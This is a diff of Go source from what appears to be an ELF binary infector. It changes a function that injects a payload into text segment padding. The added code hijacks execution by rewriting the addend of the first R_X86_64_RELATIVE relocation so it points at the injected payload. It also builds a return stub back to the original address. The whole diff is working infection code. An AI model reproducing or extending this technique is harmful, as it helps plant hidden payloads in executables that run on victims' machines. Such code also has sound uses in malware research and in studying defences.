@@ -47,7 +47,9 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		
-		
+		var origAddend int64
+		var relocEntry elf.Rela64
+
 		if (opts & CtorsHijack) == CtorsHijack {
 			
 			if debug {
@@ -98,10 +100,12 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 			if debug{
 				fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
 			}
-
-			var relocEntry elf.Rela64
+			
+			origRelocStart := o
+			
 			s := uint64(reflect.TypeOf(relocEntry).Size())		
-			for o != (dtRelaOffset + (dtRelaEntryCount * uint64(s))) {
+			endReloc := o + dtRelaEntryCount * uint64(s)
+			for o < endReloc {
 				relReader := bytes.NewBuffer(t.Contents[o : o + s])
 				if err := binary.Read(relReader, t.EIdent.Endianness, &relocEntry); err != nil {
 					return err
@@ -109,7 +113,10 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 				
 				if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
 					if debug {
-						fmt.Println("[+] Found first relative reloc...attempting to hijack.")
+						fmt.Println("[+] Found first relative reloc")
+						fmt.Printf("\toffset: 0x%016x\n", relocEntry.Off) 
+						fmt.Printf("\ttype: %s\n", elf.R_X86_64_RELATIVE.String())
+						fmt.Printf("\tAddend: 0x%016x\n", relocEntry.Addend)
 					}
 					break
 				}
@@ -119,6 +126,15 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 			if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
 				return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
 			}
+			
+			origAddend = relocEntry.Addend
+			relocEntry.Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
+			relWriter := new(bytes.Buffer)
+			if err := binary.Write(relWriter, t.EIdent.Endianness, &relocEntry); err != nil {
+				return err
+			}
+			copy(t.Contents[origRelocStart:], relWriter.Bytes())
+			
 
 		}else {
 			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
@@ -140,7 +156,12 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		}
 
 		if !((opts & NoRetOEP) == NoRetOEP) {
-			retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
+			var retStub []byte
+			if (opts & CtorsHijack) == CtorsHijack {
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
+			}else {
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
+			}
 			t.Payload.Write(retStub)
 		}
 
